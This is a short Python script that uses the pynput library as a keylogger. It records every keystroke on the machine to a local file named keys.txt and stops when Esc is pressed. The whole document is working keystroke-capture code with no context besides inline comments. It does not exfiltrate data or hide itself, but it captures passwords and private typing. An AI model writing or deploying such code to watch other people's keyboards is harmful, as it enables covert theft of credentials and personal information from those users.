from pynput.keyboard import Key, Listener

# File to store logged keys
log_file = "keys.txt"

def on_press(key):
    # Open file in append mode
    with open(log_file, "a") as f:
        try:
            # Try to write the character of the key
            f.write(f'{key.char}')
        except AttributeError:
            # Handle special keys (like space, enter, etc.)
            if key == Key.space:
                f.write(' ')  # Log space as a blank space
            elif key == Key.enter:
                f.write('\n')  # Log enter as a new line
            else:
                f.write(f'[{key}]')  # Log special keys

def on_release(key):
    # Stop listener if 'esc' is pressed
    if key == Key.esc:
        return False

# Setting up the listener to capture keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
